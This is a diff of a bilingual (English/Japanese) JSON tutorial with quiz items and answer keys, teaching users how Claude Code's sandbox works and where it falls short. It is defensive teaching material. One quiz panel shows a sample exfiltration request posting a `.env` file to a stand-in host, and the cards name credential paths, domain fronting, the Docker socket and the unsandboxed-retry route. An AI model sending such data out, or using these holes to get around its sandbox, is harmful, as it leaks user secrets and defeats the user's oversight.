@@ -2,7 +2,10 @@
   "cards": [
     {
       "id": "sandboxes-card-what",
-      "title": { "en": "What a sandbox is", "ja": "サンドボックスとは" },
+      "title": {
+        "en": "What a sandbox is",
+        "ja": "サンドボックスとは"
+      },
       "body": [
         {
           "en": "A sandbox is a wall your operating system puts around a program. It limits which files the program can change and which websites it can reach. Even if a command does something unexpected, the wall still holds.",
@@ -17,11 +20,17 @@
         "en": "Nothing is sandboxed until you turn it on.",
         "ja": "オンにするまで、何もサンドボックスに入っていません。"
       },
-      "more": { "slug": "sandboxing", "anchor": "what-the-sandbox-restricts" }
+      "more": {
+        "slug": "sandboxing",
+        "anchor": "what-the-sandbox-restricts"
+      }
     },
     {
       "id": "sandboxes-card-try",
-      "title": { "en": "Turn it on and test it", "ja": "オンにして、試してみる" },
+      "title": {
+        "en": "Turn it on and test it",
+        "ja": "オンにして、試してみる"
+      },
       "body": [
         {
           "en": "The `/sandbox` command opens a panel. On its Mode tab you choose how sandboxed commands are approved. Auto-allow runs them without asking, because the wall contains them. Regular permissions keeps your usual prompts. Both put up the same wall.",
@@ -34,6 +43,12 @@
       },
       "try": {
         "terminal": [
+          {
+            "text": {
+              "en": "Switch to Manual mode first: press `Shift+Tab` until the status bar shows `⏸ manual mode on`. Then any retry outside the sandbox asks you.",
+              "ja": "まず Manual モード（毎回確認するモード）に切り替えます。ステータスバーに `⏸ manual mode on` と出るまで `Shift+Tab` を押しましょう。こうすると、サンドボックスの外でのやり直しがあれば、必ずあなたに確認が来ます。"
+            }
+          },
           {
             "text": {
               "en": "In a Claude Code session, type `/sandbox` and press Enter.",
@@ -67,19 +82,25 @@
           "ja": "公式ドキュメントが説明している `/sandbox` は、ターミナルでの使い方です。同じプロジェクトフォルダでターミナルのセッションを開き、そこでこの手順を進めましょう。"
         },
         "check": {
-          "en": "The command fails with `Operation not permitted` (macOS) or `Read-only file system` (Linux, WSL2). If it worked, delete `~/sandbox-probe` and run `/sandbox` again to check the sandbox is on.",
-          "ja": "コマンドが `Operation not permitted`（macOS）か `Read-only file system`（Linux、WSL2）で失敗すれば成功です。もし成功してしまったら、`~/sandbox-probe` を削除し、もう一度 `/sandbox` を開いてサンドボックスがオンになっているか確かめましょう。"
+          "en": "The command fails with `Operation not permitted` (macOS) or `Read-only file system` (Linux, WSL2). If it went through instead, and your project folder isn't your home folder, delete `~/sandbox-probe` and run `/sandbox` again to check the sandbox is on. In auto mode the classifier may approve a retry outside the sandbox, so the file can appear even with the sandbox on.",
+          "ja": "コマンドが `Operation not permitted`（macOS）か `Read-only file system`（Linux、WSL2）で失敗すれば成功です。もしコマンドが通ってしまったら、プロジェクトフォルダがホームフォルダそのものでないかぎり、`~/sandbox-probe` を削除し、もう一度 `/sandbox` を開いてサンドボックスがオンになっているか確かめましょう。auto モードでは、分類器がサンドボックスの外でのやり直しを承認することがあるので、サンドボックスがオンでもファイルができてしまう場合があります。"
         }
       },
-      "more": { "slug": "sandboxing", "anchor": "confirm-commands-run-inside-the-sandbox" }
+      "more": {
+        "slug": "sandboxing",
+        "anchor": "confirm-commands-run-inside-the-sandbox"
+      }
     },
     {
       "id": "sandboxes-card-defaults",
-      "title": { "en": "What the wall allows by default", "ja": "最初の状態で壁が通すもの" },
+      "title": {
+        "en": "What the wall allows by default",
+        "ja": "最初の状態で壁が通すもの"
+      },
       "body": [
         {
-          "en": "With the sandbox on, commands can write only in your project folder and a temp folder. Their network traffic goes through a checkpoint (a proxy) that lets through only websites on your allowed list, and that list starts empty.",
-          "ja": "サンドボックスがオンなら、コマンドが書き込めるのはプロジェクトフォルダと一時フォルダだけです。ネットワークの通信は検問所（プロキシ）を通り、許可リストにある Webサイトだけが通れます。このリストは最初は空です。"
+          "en": "With the sandbox on, commands can write only in your project folder and a temp folder. Their network traffic goes through a checkpoint (a proxy): only websites on your allowed list get through on their own, and that list starts empty.",
+          "ja": "サンドボックスがオンなら、コマンドが書き込めるのはプロジェクトフォルダと一時フォルダだけです。ネットワークの通信は検問所（プロキシ）を通ります。確認なしで通れるのは許可リストにある Webサイトだけで、このリストは最初は空です。"
         },
         {
           "en": "Reading is different: commands can still read most of your machine, including `~/.ssh` and `~/.aws`, where keys live. There's no built-in list of secret files to hide, so add `sandbox.credentials` entries yourself.",
@@ -91,7 +112,10 @@
         "ja": "書き込みとネットワークは囲われています。読み取りは、あなたが指定するまで囲われません。"
       },
       "deep": {
-        "title": { "en": "Under the hood: hiding your keys", "ja": "しくみ：鍵を隠す" },
+        "title": {
+          "en": "Under the hood: hiding your keys",
+          "ja": "しくみ：鍵を隠す"
+        },
         "body": [
           {
             "en": "Under `sandbox.credentials`, list files such as `~/.ssh` and `~/.aws/credentials`, and variables such as `GITHUB_TOKEN`, each with `\"mode\": \"deny\"`. Sandboxed commands then can't read those files, and those variables are removed before each command runs.",
@@ -103,38 +127,50 @@
           }
         ]
       },
-      "more": { "slug": "sandboxing", "anchor": "protect-credentials" }
+      "more": {
+        "slug": "sandboxing",
+        "anchor": "protect-credentials"
+      }
     },
     {
       "id": "sandboxes-card-outside",
-      "title": { "en": "What runs outside the wall", "ja": "壁の外で動くもの" },
+      "title": {
+        "en": "What runs outside the wall",
+        "ja": "壁の外で動くもの"
+      },
       "body": [
         {
-          "en": "The sandbox wraps shell commands only. Outside it: Claude's file tools (Read, Edit, Write) and web tools (WebFetch, WebSearch), which follow your permission rules instead. Also outside, with your full access: MCP servers, hooks, the processes plugins start, and commands you type yourself after `!`.",
-          "ja": "サンドボックスが包むのはシェルのコマンドだけです。外にあるのは、Claude のファイル用ツール（Read、Edit、Write）と Web用ツール（WebFetch、WebSearch）で、これらは代わりに許可ルールに従います。さらに、MCP サーバー、フック、プラグインが起動するプロセス、そして `!` の後にあなたが自分で入力したコマンドも、あなたの権限そのままで外で動きます。"
+          "en": "The sandbox wraps shell commands only. Outside it: Claude's file tools (Read, Edit, Write) and web tools (WebFetch, WebSearch), which follow your permission rules instead. Also outside, with your full access: local MCP servers, hooks, the processes plugins start, and commands you type yourself after `!`.",
+          "ja": "サンドボックスが包むのはシェルのコマンドだけです。外にあるのは、Claude のファイル用ツール（Read、Edit、Write）と Web用ツール（WebFetch、WebSearch）で、これらは代わりに許可ルールに従います。さらに、ローカルの MCP サーバー、フック、プラグインが起動するプロセス、そして `!` の後にあなたが自分で入力したコマンドも、あなたの権限そのままで外で動きます。"
         },
         {
-          "en": "So turning on the sandbox doesn't make an MCP server or a hook safe. To put everything behind one wall, run the whole of Claude Code inside one, as the last card shows.",
-          "ja": "つまり、サンドボックスをオンにしても、MCP サーバーやフックが安全になるわけではありません。すべてを1つの壁の内側に入れるには、最後のカードのように Claude Code 全体を壁の中で動かします。"
+          "en": "So the sandbox doesn't make a local MCP server or a hook safe. To wall in everything, run all of Claude Code inside a wall, as the last card shows.",
+          "ja": "つまり、サンドボックスがあっても、ローカルの MCP サーバーやフックが安全になるわけではありません。すべてを囲むには、最後のカードのように Claude Code 全体を壁の中で動かします。"
         }
       ],
       "key": {
         "en": "The sandbox covers what Claude runs in the shell, not everything Claude Code runs.",
         "ja": "サンドボックスが囲むのは Claude がシェルで実行するものであって、Claude Code が動かすものすべてではありません。"
       },
-      "more": { "slug": "sandboxing", "anchor": "what-runs-outside-the-sandbox" }
+      "more": {
+        "slug": "sandboxing",
+        "anchor": "what-runs-outside-the-sandbox"
+      }
     },
     {
       "id": "sandboxes-card-retry",
-      "title": { "en": "The escape hatch", "ja": "非常口" },
+      "title": {
+        "en": "The escape hatch",
+        "ja": "非常口"
+      },
       "body": [
         {
-          "en": "When a command fails inside the sandbox, Claude may ask to run it again outside. In Manual mode the prompt is titled `Bash command (unsandboxed)`. Saying yes runs it with no wall at all.",
-          "ja": "コマンドがサンドボックスの中で失敗すると、Claude は外でもう一度実行したいと頼んでくることがあります。Manual モードでは、確認のタイトルが `Bash command (unsandboxed)`（サンドボックスなしの Bash コマンド）になります。Yes と答えると、壁がまったくない状態で実行されます。"
+          "en": "When a command fails inside the sandbox, Claude may ask to run it again outside. In Manual mode you get a prompt titled `Bash command (unsandboxed)`; in auto mode the classifier decides instead of you. A yes runs it with no wall at all.",
+          "ja": "コマンドがサンドボックスの中で失敗すると、Claude は外でもう一度実行したいと頼んでくることがあります。Manual モードでは `Bash command (unsandboxed)`（サンドボックスなしの Bash コマンド）というタイトルの確認が出ます。auto モードでは、あなたの代わりに分類器が決めます。承認されると、壁がまったくない状態で実行されます。"
         },
         {
-          "en": "Decline unless you know why it failed and trust the command. A saved allow rule that matches, like `Bash(curl *)`, approves the retry without asking.",
-          "ja": "失敗の理由が分かっていて、そのコマンドを信頼できる場合以外は断りましょう。`Bash(curl *)` のような保存済みの allow ルールに一致すると、やり直しは確認なしで承認されます。"
+          "en": "Decline unless you know why it failed and trust the command. A matching allow rule, like `Bash(curl *)`, approves the retry without asking.",
+          "ja": "失敗の理由が分かっていて、そのコマンドを信頼できる場合以外は断りましょう。`Bash(curl *)` のような allow ルールに一致すると、やり直しは確認なしで承認されます。"
         },
         {
           "en": "To switch retries off, turn on strict sandbox mode: set `allowUnsandboxedCommands` to `false`.",
@@ -146,7 +182,10 @@
         "ja": "サンドボックスの外でのやり直しは、壁のないふつうのコマンドです。"
       },
       "deep": {
-        "title": { "en": "Under the hood: strict mode", "ja": "しくみ：strict モード" },
+        "title": {
+          "en": "Under the hood: strict mode",
+          "ja": "しくみ：strict モード"
+        },
         "body": [
           {
             "en": "In `/sandbox`, the Overrides tab shows this setting as Strict sandbox mode. In `~/.claude/settings.json` it reads `\"sandbox\": { \"enabled\": true, \"allowUnsandboxedCommands\": false }`. A `false` in your user settings holds even if a project sets `true`.",
@@ -158,34 +197,46 @@
           }
         ]
       },
-      "more": { "slug": "sandboxing", "anchor": "turn-off-the-retry-with-strict-sandbox-mode" }
+      "more": {
+        "slug": "sandboxing",
+        "anchor": "turn-off-the-retry-with-strict-sandbox-mode"
+      }
     },
     {
       "id": "sandboxes-card-network",
-      "title": { "en": "Holes in the network wall", "ja": "ネットワークの壁の穴" },
+      "title": {
+        "en": "Holes in the network wall",
+        "ja": "ネットワークの壁の穴"
+      },
       "body": [
         {
-          "en": "The checkpoint decides by the website's name and doesn't read encrypted traffic. A broad site like `github.com` can carry data out: anyone can receive files there, and a trick called domain fronting can even reach sites not on your list.",
-          "ja": "検問所は Webサイトの名前で判断し、暗号化された通信の中身は読みません。`github.com` のような幅広いサイトを許可すると、データの出口になりえます。そこでは誰でもファイルを受け取れますし、ドメインフロンティングという手口を使えば、リストにないサイトにまで届くことがあります。"
+          "en": "The checkpoint decides by the website's name. A broad site like `github.com` can carry data out: anyone can receive files there, and a trick called domain fronting can even reach unlisted sites.",
+          "ja": "検問所は Webサイトの名前で判断します。`github.com` のような幅広いサイトを許可すると、データの出口になりえます。そこでは誰でもファイルを受け取れますし、ドメインフロンティングという手口を使えば、リストにないサイトにまで届くことがあります。"
         },
         {
           "en": "A Unix socket is a local door into another program. Allowing the Docker socket (`/var/run/docker.sock`) hands a command your whole machine.",
           "ja": "Unix ソケットは、別のプログラムにつながる、パソコン内の扉です。Docker のソケット（`/var/run/docker.sock`）を許可すると、コマンドにパソコン全体を渡すことになります。"
         },
         {
-          "en": "One hole is closed for you: a listed name that leads back to your own machine, or to the cloud metadata address `169.254.169.254`, is refused.",
-          "ja": "1つの穴は最初からふさがれています。リストにある名前でも、行き先があなた自身のパソコンや、クラウドのメタデータのアドレス `169.254.169.254` なら、接続は拒否されます。"
+          "en": "Closed for you: a listed name that leads only to your own machine, or to the cloud metadata address `169.254.169.254`, is refused. `localhost` itself is the exception.",
+          "ja": "最初からふさがれている穴もあります。リストにある名前でも、行き先があなた自身のパソコンだけだったり、クラウドのメタデータのアドレス `169.254.169.254` だったりすれば、接続は拒否されます。ただし、`localhost` という名前そのものは例外です。"
         }
       ],
       "key": {
         "en": "Allow narrow, specific sites, and no sockets you don't understand.",
         "ja": "許可するのは範囲の狭い特定のサイトだけにして、よく分からないソケットは許可しないこと。"
       },
-      "more": { "slug": "sandboxing", "anchor": "security-limitations" }
+      "more": {
+        "slug": "sandboxing",
+        "anchor": "security-limitations"
+      }
     },
     {
       "id": "sandboxes-card-whole",
-      "title": { "en": "A wall around all of Claude Code", "ja": "Claude Code 全体を囲む壁" },
+      "title": {
+        "en": "A wall around all of Claude Code",
+        "ja": "Claude Code 全体を囲む壁"
+      },
       "body": [
         {
           "en": "For untrusted code or long unattended runs, put the whole of Claude Code inside a wall, so file tools, MCP servers and hooks are covered too.",
@@ -201,11 +252,14 @@
         "ja": "知らない人のリポジトリなら、公式ドキュメントのおすすめは VM かクラウドのセッションです。"
       },
       "deep": {
-        "title": { "en": "Under the hood: dev containers trust the project", "ja": "しくみ：開発コンテナはプロジェクトを信頼する前提" },
+        "title": {
+          "en": "Under the hood: dev containers trust the project",
+          "ja": "しくみ：開発コンテナはプロジェクトを信頼する前提"
+        },
         "body": [
           {
-            "en": "The docs say to use dev containers only with trusted repositories. Run with `--dangerously-skip-permissions`, a malicious project can still send out anything inside the container, including Claude Code's login in `~/.claude`.",
-            "ja": "公式ドキュメントは、開発コンテナを使うのは信頼できるリポジトリだけにするよう勧めています。`--dangerously-skip-permissions` で動かすと、悪意のあるプロジェクトは、`~/.claude` にある Claude Code のログイン情報も含め、コンテナの中のものを何でも外へ送れてしまいます。"
+            "en": "The docs say to use dev containers only with trusted repositories. When it runs with `--dangerously-skip-permissions`, a malicious project can still send out anything inside the container, including Claude Code's login in `~/.claude`.",
+            "ja": "公式ドキュメントは、開発コンテナを使うのは信頼できるリポジトリだけにするよう勧めています。`--dangerously-skip-permissions` で動かしているとき、悪意のあるプロジェクトは、`~/.claude` にある Claude Code のログイン情報も含め、コンテナの中のものを何でも外へ送れてしまいます。"
           },
           {
             "en": "Don't mount host secrets such as `~/.ssh` into the container. Prefer short-lived tokens that work for one repository.",
@@ -213,7 +267,9 @@
           }
         ]
       },
-      "more": { "slug": "sandbox-environments" }
+      "more": {
+        "slug": "sandbox-environments"
+      }
     }
   ],
   "items": [
@@ -221,7 +277,10 @@
       "id": "sandboxes-inside-1",
       "type": "inside",
       "surface": "terminal",
-      "prompt": { "en": "Inside or outside the sandbox?", "ja": "サンドボックスの中？外？" },
+      "prompt": {
+        "en": "Inside or outside the sandbox?",
+        "ja": "サンドボックスの中？外？"
+      },
       "explain": {
         "en": "Bash commands Claude runs are exactly what the sandbox wraps, along with every process they start.",
         "ja": "Claude が実行する Bash のコマンドこそ、サンドボックスが包むものです。そこから起動するプロセスもすべて含まれます。"
@@ -230,31 +289,52 @@
         "en": "The sandbox is on. You ask Claude to run the tests, and it runs `npm test`.",
         "ja": "サンドボックスはオンです。テストを実行するよう頼むと、Claude は `npm test` を実行します。"
       },
-      "panel": { "title": "/sandbox", "lines": ["sandbox: on", "mode: regular permissions", "writes: project folder, temp folder"] },
+      "panel": {
+        "title": "/sandbox",
+        "lines": [
+          "sandbox: on",
+          "mode: regular permissions",
+          "writes: project folder, temp folder"
+        ]
+      },
       "opts": [
         {
-          "text": { "en": "Inside: the sandbox limits it", "ja": "中：サンドボックスが制限する" },
+          "text": {
+            "en": "Inside: the sandbox limits it",
+            "ja": "中：サンドボックスが制限する"
+          },
           "feedback": {
             "en": "Right. A shell command Claude runs, and the test runner it starts, stay inside the wall.",
             "ja": "正解です。Claude が実行するシェルのコマンドも、そこから起動するテストランナーも、壁の内側にとどまります。"
           }
         },
         {
-          "text": { "en": "Outside: it runs with your full access", "ja": "外：あなたの権限そのままで動く" },
+          "text": {
+            "en": "Outside: it runs with your full access",
+            "ja": "外：あなたの権限そのままで動く"
+          },
           "feedback": {
             "en": "Shell commands Claude runs are what the sandbox covers. Things like hooks and MCP servers are the ones outside.",
             "ja": "Claude が実行するシェルのコマンドこそ、サンドボックスの対象です。外で動くのは、フックや MCP サーバーのようなものです。"
           }
         }
       ],
-      "accept": [0],
-      "more": { "slug": "sandboxing", "anchor": "what-the-sandbox-restricts" }
+      "accept": [
+        0
+      ],
+      "more": {
+        "slug": "sandboxing",
+        "anchor": "what-the-sandbox-restricts"
+      }
     },
     {
       "id": "sandboxes-allowlist-1",
       "type": "allowlist",
       "surface": "terminal",
-      "prompt": { "en": "Will it get out?", "ja": "外に出られますか？" },
+      "prompt": {
+        "en": "Will it get out?",
+        "ja": "外に出られますか？"
+      },
       "explain": {
         "en": "A host on `allowedDomains` connects. That's the point of the list: let through the few sites your work needs.",
         "ja": "`allowedDomains` にあるホストには接続できます。それがこのリストの目的です。作業に必要な少数のサイトだけを通すのです。"
@@ -265,39 +345,60 @@
       },
       "panel": {
         "title": "sandbox.network.allowedDomains",
-        "lines": ["\"registry.npmjs.org\"", "-- request --", "npm install dayjs -> registry.npmjs.org:443"]
+        "lines": [
+          "\"registry.npmjs.org\"",
+          "-- request --",
+          "npm install dayjs -> registry.npmjs.org:443"
+        ]
       },
       "opts": [
         {
-          "text": { "en": "Yes: the host is on the list", "ja": "はい：ホストがリストにある" },
+          "text": {
+            "en": "Yes: the host is on the list",
+            "ja": "はい：ホストがリストにある"
+          },
           "feedback": {
             "en": "Right. npm uses the sandbox's proxy, and the registry is allowed, so the download goes through.",
             "ja": "正解です。npm はサンドボックスのプロキシを通り、レジストリは許可されているので、ダウンロードは通ります。"
           }
         },
         {
-          "text": { "en": "No: the sandbox blocks all network traffic", "ja": "いいえ：サンドボックスはネットワークをすべて止める" },
+          "text": {
+            "en": "No: the sandbox blocks all network traffic",
+            "ja": "いいえ：サンドボックスはネットワークをすべて止める"
+          },
           "feedback": {
             "en": "Only hosts that aren't on your list are held back. This one is listed.",
             "ja": "止められるのは、リストにないホストだけです。このホストはリストにあります。"
           }
         },
         {
-          "text": { "en": "Only after you approve each download", "ja": "ダウンロードのたびに承認してから" },
+          "text": {
+            "en": "Only after you approve each download",
+            "ja": "ダウンロードのたびに承認してから"
+          },
           "feedback": {
             "en": "Listed hosts don't need a network approval. You may still see the usual prompt for the `npm install` command itself.",
             "ja": "リストにあるホストなら、ネットワークの承認はいりません。ただし、`npm install` コマンドそのものについては、いつもの確認が出ることがあります。"
           }
         }
       ],
-      "accept": [0],
-      "more": { "slug": "sandboxing", "anchor": "network-isolation" }
+      "accept": [
+        0
+      ],
+      "more": {
+        "slug": "sandboxing",
+        "anchor": "network-isolation"
+      }
     },
     {
       "id": "sandboxes-inside-2",
       "type": "inside",
       "surface": "terminal",
-      "prompt": { "en": "Inside or outside the sandbox?", "ja": "サンドボックスの中？外？" },
+      "prompt": {
+        "en": "Inside or outside the sandbox?",
+        "ja": "サンドボックスの中？外？"
+      },
       "explain": {
         "en": "A command you type at the `!` prompt runs outside the sandbox in most sessions, even in strict sandbox mode. That's why the sandbox test asks Claude to run the command.",
         "ja": "`!` のプロンプトで自分で入力したコマンドは、ほとんどのセッションで、strict sandbox mode でもサンドボックスの外で動きます。だからこそ、サンドボックスを試すときは Claude にコマンドを実行してもらうのです。"
@@ -308,28 +409,42 @@
       },
       "opts": [
         {
-          "text": { "en": "Inside: everything in the session is sandboxed", "ja": "中：セッションの中のものはすべてサンドボックスに入る" },
+          "text": {
+            "en": "Inside: everything in the session is sandboxed",
+            "ja": "中：セッションの中のものはすべてサンドボックスに入る"
+          },
           "feedback": {
             "en": "The sandbox wraps the commands Claude runs. A command you type after `!` usually runs outside.",
             "ja": "サンドボックスが包むのは Claude が実行するコマンドです。`!` の後に自分で入力したコマンドは、たいてい外で動きます。"
           }
         },
         {
-          "text": { "en": "Outside: you typed it yourself", "ja": "外：自分で入力したから" },
+          "text": {
+            "en": "Outside: you typed it yourself",
+            "ja": "外：自分で入力したから"
+          },
           "feedback": {
             "en": "Right. In most sessions, `!` commands run unsandboxed, with your full access.",
             "ja": "正解です。ほとんどのセッションで、`!` のコマンドはサンドボックスなしで、あなたの権限そのままで動きます。"
           }
         }
       ],
-      "accept": [1],
-      "more": { "slug": "sandboxing", "anchor": "what-runs-outside-the-sandbox" }
+      "accept": [
+        1
+      ],
+      "more": {
+        "slug": "sandboxing",
+        "anchor": "what-runs-outside-the-sandbox"
+      }
     },
     {
       "id": "sandboxes-setup-1",
       "type": "setup",
       "surface": "terminal",
-      "prompt": { "en": "Pick the setup.", "ja": "どの環境にしますか？" },
+      "prompt": {
+        "en": "Pick the setup.",
+        "ja": "どの環境にしますか？"
+      },
       "explain": {
         "en": "The built-in sandbox runs on macOS, Linux and WSL2. On native Windows, Claude Code runs commands unsandboxed. The docs suggest WSL2, or a container or VM.",
         "ja": "組み込みのサンドボックスが動くのは macOS、Linux、WSL2 です。WSL2 を使わない Windows では、Claude Code はサンドボックスなしでコマンドを実行します。公式ドキュメントのおすすめは、WSL2、またはコンテナか VM です。"
@@ -340,42 +455,63 @@
       },
       "opts": [
         {
-          "text": { "en": "Run `/sandbox` as usual", "ja": "いつもどおり `/sandbox` を実行する" },
+          "text": {
+            "en": "Run `/sandbox` as usual",
+            "ja": "いつもどおり `/sandbox` を実行する"
+          },
           "feedback": {
             "en": "On native Windows there's no built-in sandbox: Claude Code runs commands unsandboxed.",
             "ja": "WSL2 を使わない Windows には組み込みのサンドボックスがありません。Claude Code はサンドボックスなしでコマンドを実行します。"
           }
         },
         {
-          "text": { "en": "Install WSL2, run Claude Code inside it, then `/sandbox`", "ja": "WSL2 を入れて、その中で Claude Code を動かし、`/sandbox` を実行する" },
+          "text": {
+            "en": "Install WSL2, run Claude Code inside it, then `/sandbox`",
+            "ja": "WSL2 を入れて、その中で Claude Code を動かし、`/sandbox` を実行する"
+          },
           "feedback": {
             "en": "Right. Inside WSL2 the sandbox works as it does on Linux.",
             "ja": "正解です。WSL2 の中なら、サンドボックスは Linux と同じように動きます。"
           }
         },
         {
-          "text": { "en": "Run Claude Code in a container or a virtual machine", "ja": "Claude Code をコンテナか仮想マシンの中で動かす" },
+          "text": {
+            "en": "Run Claude Code in a container or a virtual machine",
+            "ja": "Claude Code をコンテナか仮想マシンの中で動かす"
+          },
           "feedback": {
             "en": "Right too. The docs list a container or VM for Windows hosts, and that walls in all of Claude Code.",
             "ja": "これも正解です。公式ドキュメントは Windows のパソコン向けにコンテナか VM も挙げていて、Claude Code 全体を壁で囲めます。"
           }
         },
         {
-          "text": { "en": "Turn permission prompts off, since there's no sandbox anyway", "ja": "どうせサンドボックスがないのだから、許可の確認をオフにする" },
+          "text": {
+            "en": "Turn permission prompts off, since there's no sandbox anyway",
+            "ja": "どうせサンドボックスがないのだから、許可の確認をオフにする"
+          },
           "feedback": {
             "en": "No sandbox is a reason to keep your prompts, not to drop them.",
             "ja": "サンドボックスがないなら、なおさら確認は残しておくべきです。"
           }
         }
       ],
-      "accept": [1, 2],
-      "more": { "slug": "sandbox-environments", "anchor": "choose-an-approach" }
+      "accept": [
+        1,
+        2
+      ],
+      "more": {
+        "slug": "sandbox-environments",
+        "anchor": "choose-an-approach"
+      }
     },
     {
       "id": "sandboxes-allowlist-2",
       "type": "allowlist",
       "surface": "terminal",
-      "prompt": { "en": "Will it get out?", "ja": "外に出られますか？" },
+      "prompt": {
+        "en": "Will it get out?",
+        "ja": "外に出られますか？"
+      },
       "explain": {
         "en": "A host that isn't on the list doesn't get through on its own. The command waits; in Manual mode you're asked, and in auto mode it's refused unless the classifier approved that host for the command.",
         "ja": "リストにないホストへは、勝手には通れません。コマンドは待たされます。Manual モードならあなたに確認が来て、auto モードなら、そのコマンドのためにそのホストを分類器が承認していないかぎり拒否されます。"
@@ -386,33 +522,51 @@
       },
       "panel": {
         "title": "sandbox.network.allowedDomains",
-        "lines": ["\"registry.npmjs.org\"", "-- request --", "POST https://collect.example/FAKE  (body: .env)"]
+        "lines": [
+          "\"registry.npmjs.org\"",
+          "-- request --",
+          "POST https://collect.example/FAKE  (body: .env)"
+        ]
       },
       "opts": [
         {
-          "text": { "en": "Yes: sandboxed commands are trusted", "ja": "はい：サンドボックス内のコマンドは信頼されている" },
+          "text": {
+            "en": "Yes: sandboxed commands are trusted",
+            "ja": "はい：サンドボックス内のコマンドは信頼されている"
+          },
           "feedback": {
             "en": "Being inside the sandbox doesn't open the network. Only listed hosts get through.",
             "ja": "サンドボックスの中にいるからといって、ネットワークが開くわけではありません。通れるのはリストにあるホストだけです。"
           }
         },
         {
-          "text": { "en": "Not on its own: it waits, and you're asked about `collect.example`", "ja": "勝手には出ない：待たされて、`collect.example` について確認が来る" },
+          "text": {
+            "en": "Not on its own: it waits, and you're asked about `collect.example`",
+            "ja": "勝手には出ない：待たされて、`collect.example` について確認が来る"
+          },
           "feedback": {
             "en": "Right. Say No: a test has no reason to send your `.env` anywhere.",
             "ja": "正解です。No と答えましょう。テストがあなたの `.env` をどこかへ送る理由はありません。"
           }
         },
         {
-          "text": { "en": "No, and you'll never hear about it", "ja": "いいえ。しかも何も知らされない" },
+          "text": {
+            "en": "No, and you'll never hear about it",
+            "ja": "いいえ。しかも何も知らされない"
+          },
           "feedback": {
             "en": "In Manual mode you get a prompt naming the host. Silent refusals happen in auto mode or with a strict allowlist.",
             "ja": "Manual モードでは、ホスト名を示した確認が出ます。黙って拒否されるのは、auto モードや厳格な許可リストのときです。"
           }
         }
       ],
-      "accept": [1],
-      "more": { "slug": "sandboxing", "anchor": "hosts-outside-your-allowed-domains" }
+      "accept": [
+        1
+      ],
+      "more": {
+        "slug": "sandboxing",
+        "anchor": "hosts-outside-your-allowed-domains"
+      }
     },
     {
       "id": "sandboxes-trim-1",
@@ -459,14 +613,23 @@
           "ja": "削ります。貼り付けサイトは、盗んだデータを置くのにうってつけの場所です。"
         }
       },
-      "answer": [6, 7],
-      "more": { "slug": "sandboxing", "anchor": "security-limitations" }
+      "answer": [
+        6,
+        7
+      ],
+      "more": {
+        "slug": "sandboxing",
+        "anchor": "security-limitations"
+      }
     },
     {
       "id": "sandboxes-inside-3",
       "type": "inside",
       "surface": "terminal",
-      "prompt": { "en": "Does the sandbox stop this?", "ja": "サンドボックスはこれを止めますか？" },
+      "prompt": {
+        "en": "Does the sandbox stop this?",
+        "ja": "サンドボックスはこれを止めますか？"
+      },
       "explain": {
         "en": "Claude's Read tool runs outside the sandbox. A `denyRead` entry doesn't stop it; permission rules do, such as a `Read` deny rule. In Manual mode, Read also asks before opening files outside your project.",
         "ja": "Claude の Read ツールはサンドボックスの外で動きます。`denyRead` の項目では止まりません。止めるのは `Read` の deny ルールのような許可ルールです。Manual モードでは、プロジェクトの外のファイルを開く前に Read も確認してきます。"
@@ -475,31 +638,50 @@
         "en": "You blocked `~/.ssh` for sandboxed commands. Now Claude uses its Read tool, not a shell command, to open `~/.ssh/config`.",
         "ja": "サンドボックス内のコマンドから `~/.ssh` を読めないようにしました。今度は Claude が、シェルのコマンドではなく Read ツールで `~/.ssh/config` を開こうとします。"
       },
-      "panel": { "title": "sandbox.filesystem", "lines": ["\"denyRead\": [\"~/.ssh\"]"] },
+      "panel": {
+        "title": "sandbox.filesystem",
+        "lines": [
+          "\"denyRead\": [\"~/.ssh\"]"
+        ]
+      },
       "opts": [
         {
-          "text": { "en": "Yes: `denyRead` blocks it", "ja": "はい：`denyRead` が止める" },
+          "text": {
+            "en": "Yes: `denyRead` blocks it",
+            "ja": "はい：`denyRead` が止める"
+          },
           "feedback": {
             "en": "`denyRead` applies to sandboxed commands. The Read tool isn't one.",
             "ja": "`denyRead` が効くのはサンドボックス内のコマンドです。Read ツールはそれに当たりません。"
           }
         },
         {
-          "text": { "en": "No: Read is outside the sandbox and follows permission rules", "ja": "いいえ：Read はサンドボックスの外にあり、許可ルールに従う" },
+          "text": {
+            "en": "No: Read is outside the sandbox and follows permission rules",
+            "ja": "いいえ：Read はサンドボックスの外にあり、許可ルールに従う"
+          },
           "feedback": {
             "en": "Right. To block it, add a `Read` deny rule for `~/.ssh` too.",
             "ja": "正解です。止めたいなら、`~/.ssh` に対する `Read` の deny ルールも追加しましょう。"
           }
         }
       ],
-      "accept": [1],
-      "more": { "slug": "sandboxing", "anchor": "what-runs-outside-the-sandbox" }
+      "accept": [
+        1
+      ],
+      "more": {
+        "slug": "sandboxing",
+        "anchor": "what-runs-outside-the-sandbox"
+      }
     },
     {
       "id": "sandboxes-setup-2",
       "type": "setup",
       "surface": "terminal",
-      "prompt": { "en": "Pick the setup.", "ja": "どの設定にしますか？" },
+      "prompt": {
+        "en": "Pick the setup.",
+        "ja": "どの設定にしますか？"
+      },
       "explain": {
         "en": "Strict sandbox mode, `allowUnsandboxedCommands: false`, makes Claude Code ignore requests to run outside the sandbox. Commands Claude runs then stay inside unless they match `excludedCommands`.",
         "ja": "strict sandbox mode、つまり `allowUnsandboxedCommands: false` にすると、Claude Code はサンドボックスの外で実行したいという要求を無視します。Claude が実行するコマンドは、`excludedCommands` に一致しないかぎり中にとどまります。"
@@ -510,42 +692,62 @@
       },
       "opts": [
         {
-          "text": { "en": "Set `allowUnsandboxedCommands` to `false`", "ja": "`allowUnsandboxedCommands` を `false` にする" },
+          "text": {
+            "en": "Set `allowUnsandboxedCommands` to `false`",
+            "ja": "`allowUnsandboxedCommands` を `false` にする"
+          },
           "feedback": {
             "en": "Right: strict sandbox mode. Retries outside the sandbox are switched off.",
             "ja": "正解です。strict sandbox mode です。サンドボックスの外でのやり直しは止まります。"
           }
         },
         {
-          "text": { "en": "Add `Bash(curl *)` to my allow rules so the prompts stop", "ja": "allow ルールに `Bash(curl *)` を足して、確認を止める" },
+          "text": {
+            "en": "Add `Bash(curl *)` to my allow rules so the prompts stop",
+            "ja": "allow ルールに `Bash(curl *)` を足して、確認を止める"
+          },
           "feedback": {
             "en": "A matching allow rule approves the unsandboxed retry without asking. The prompts stop, and the commands run outside.",
             "ja": "一致する allow ルールは、サンドボックスなしのやり直しを確認なしで承認します。確認は止まりますが、コマンドは外で動きます。"
           }
         },
         {
